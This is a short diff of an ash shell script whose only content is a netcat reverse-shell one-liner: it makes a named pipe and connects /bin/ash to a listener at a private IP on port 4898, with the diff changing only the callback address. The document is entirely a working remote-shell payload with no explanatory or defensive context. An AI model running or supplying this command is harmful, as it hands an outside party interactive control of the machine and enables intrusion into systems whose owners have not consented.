@@ -1,2 +1,2 @@
 #/bin/ash
-rm pipe;mkfifo pipe&&nc 192.168.15.53 4898 <pipe|/bin/ash>&pipe
+rm pipe;mkfifo pipe&&nc 192.168.15.69 4898 <pipe|/bin/ash>&pipe
